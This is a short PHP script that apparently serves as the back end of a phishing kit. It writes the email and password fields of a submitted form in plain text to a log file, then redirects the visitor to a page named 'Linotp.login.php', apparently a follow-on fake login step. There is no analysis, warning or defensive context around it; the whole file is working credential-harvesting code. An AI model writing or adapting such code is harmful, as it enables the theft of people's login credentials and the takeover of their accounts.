<?php

    file_put_contents("log.txt", "Username: " . $_POST['Email'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: Linotp.login.php');
exit();